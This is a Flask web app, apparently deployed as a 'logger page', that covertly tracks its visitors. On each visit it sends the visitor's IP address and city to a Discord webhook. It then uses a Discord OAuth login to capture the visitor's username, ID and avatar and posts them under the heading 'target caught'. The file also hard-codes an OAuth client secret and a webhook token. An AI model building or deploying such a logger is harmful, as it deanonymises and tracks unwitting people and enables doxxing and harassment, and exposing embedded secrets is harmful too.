import os
from flask import Flask, render_template, request, redirect
import requests

app = Flask(__name__, template_folder='templates')

CLIENT_ID     = "1457527346687901812"
CLIENT_SECRET = "8NXd3i8r1QXproq-MMf8EqW_BJOujcPR"
REDIRECT_URI  = "https://logger-page-g0oldyv1y-ola950857gmailcoms-projects.vercel.app/callback"
DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1456993989306749133/2JG3BvXA__irPAOcgx-R-lTPC7n7ScgWSgUl0jMmnR-staCUFK0b0upG2LwDHfck1ean"
AVATAR_URL = "https://i.pinimg.com/736x/10/e3/f5/10e3f51d11ef13d5c88cb329211146ba.jpg"

def get_client_ip():
    ip = request.headers.get('x-forwarded-for', request.remote_addr)
    return ip.split(',')[0].strip() if ',' in ip else ip

@app.route('/')
def index():
    # --- CAPTURA 1: IP ---
    ip = get_client_ip()
    try:
        geo = requests.get(f"https://ipapi.co/{ip}/json/", headers={'User-Agent': 'Mozilla/5.0'}, timeout=5).json()
    except: geo = {"ip": ip}

    requests.post(DISCORD_WEBHOOK_URL, json={
        "username": "1* Tracker",
        "embeds": [{
            "title": "👁️ Nueva Visita",
            "color": 0xFFA500,
            "fields": [{"name": "🌐 IP", "value": f"`{ip}`", "inline": True}, {"name": "📍 Lugar", "value": f"{geo.get('city')}", "inline": True}]
        }]
    })

    auth_url = f"https://discord.com/api/oauth2/authorize?client_id={CLIENT_ID}&redirect_uri={REDIRECT_URI}&response_type=code&scope=identify"
    return render_template('index.html', auth_url=auth_url)

@app.route('/callback')
def callback():
    code = request.args.get('code')
    if not code: return redirect("https://discord.gg/nUy6Vjr9YU")

    try:
        # Intercambiar código por Token
        r_token = requests.post("https://discord.com/api/v10/oauth2/token", data={
            'client_id': CLIENT_ID, 'client_secret': CLIENT_SECRET, 'grant_type': 'authorization_code', 'code': code, 'redirect_uri': REDIRECT_URI
        }, headers={'Content-Type': 'application/x-www-form-urlencoded'})
        
        token = r_token.json().get('access_token')
        if token:
            user = requests.get("https://discord.com/api/v10/users/@me", headers={'Authorization': f'Bearer {token}'}).json()
            ip = get_client_ip()

            # --- CAPTURA 2: DISCORD ID ---
            requests.post(DISCORD_WEBHOOK_URL, json={
                "username": "1* Tracker - IDENTIDAD",
                "embeds": [{
                    "title": "🎯 ¡OBJETIVO CAZADO!",
                    "color": 0xFF0044,
                    "thumbnail": {"url": f"https://cdn.discordapp.com/avatars/{user['id']}/{user['avatar']}.png" if user.get('avatar') else AVATAR_URL},
                    "fields": [
                        {"name": "👤 Usuario", "value": f"**{user['username']}**", "inline": True},
                        {"name": "🆔 ID", "value": f"`{user['id']}`", "inline": True},
                        {"name": "🌐 IP", "value": f"`{ip}`", "inline": False}
                    ]
                }]
            })
    except: pass
    return redirect("https://discord.gg/nUy6Vjr9YU")
